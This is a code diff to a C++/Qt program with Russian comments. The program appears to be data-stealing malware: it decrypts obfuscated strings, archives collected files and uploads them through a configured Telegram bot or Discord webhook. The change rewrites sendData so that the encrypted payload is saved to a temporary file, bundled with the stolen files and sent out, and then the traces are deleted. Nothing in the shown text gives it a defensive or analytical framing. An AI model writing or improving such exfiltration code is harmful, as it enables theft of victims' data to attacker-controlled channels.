@@ -70,9 +70,6 @@ std::string decryptString(const std::string& encrypted, size_t keyOffset) {
     return decrypted;
 }
 
-// Определение глобальной переменной
-MainWindow* g_mainWindow = nullptr;
-
 // Функция для получения данных от libcurl
 static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
     size_t newLength = size * nmemb;
@@ -1622,7 +1619,7 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
 }
 
 // Реализация sendToTelegram
-void MainWindow::sendToTelegram(const std::string& /*data*/, const std::vector<std::string>& files) {
+void MainWindow::sendToTelegram(const std::vector<std::string>& files) {
     emitLog("Отправка данных через Telegram...");
 
     if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
@@ -1697,7 +1694,7 @@ void MainWindow::sendToTelegram(const std::string& /*data*/, const std::vector<s
 }
 
 // Реализация sendToDiscord
-void MainWindow::sendToDiscord(const std::string& /*data*/, const std::vector<std::string>& files) {
+void MainWindow::sendToDiscord(const std::vector<std::string>& files) {
     emitLog("Отправка данных через Discord...");
 
     if (config.discordWebhook.empty()) {
@@ -1765,13 +1762,42 @@ void MainWindow::sendToDiscord(const std::string& /*data*/, const std::vector<st
 
 // Реализация sendData
 void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
-    std::string data = encryptedData.toStdString();
-    if (config.sendMethod == "Telegram") {
-        sendToTelegram(data, files);
-    } else if (config.sendMethod == "Discord") {
-        sendToDiscord(data, files);
+    emitLog("Подготовка данных для отправки...");
+
+    // Создаем временный файл для encryptedData
+    std::string tempDir = "temp_" + generateRandomString(8);
+    std::filesystem::create_directories(tempDir);
+    std::string dataFilePath = tempDir + "/encrypted_data.txt";
+    std::ofstream dataFile(dataFilePath, std::ios::binary);
+    if (dataFile.is_open()) {
+        std::string data = encryptedData.toStdString();
+        dataFile.write(data.c_str(), data.size());
+        dataFile.close();
     } else {
-        saveToLocalFile(data, "output");
+        emitLog("Ошибка: Не удалось создать временный файл для encryptedData");
+        std::filesystem::remove_all(tempDir);
+        return;
+    }
+
+    // Добавляем временный файл в список файлов
+    std::vector<std::string> allFiles = files;
+    allFiles.push_back(dataFilePath);
+
+    // Выбираем метод отправки
+    if (config.sendMethod == "Telegram") {
+        sendToTelegram(allFiles);
+    } else if (config.sendMethod == "Discord") {
+        sendToDiscord(allFiles);
+    } else {
+        saveToLocalFile(encryptedData.toStdString(), "output");
+    }
+
+    // Удаляем временную директорию
+    try {
+        std::filesystem::remove_all(tempDir);
+        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
+    } catch (const std::exception& e) {
+        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
     }
 }
 
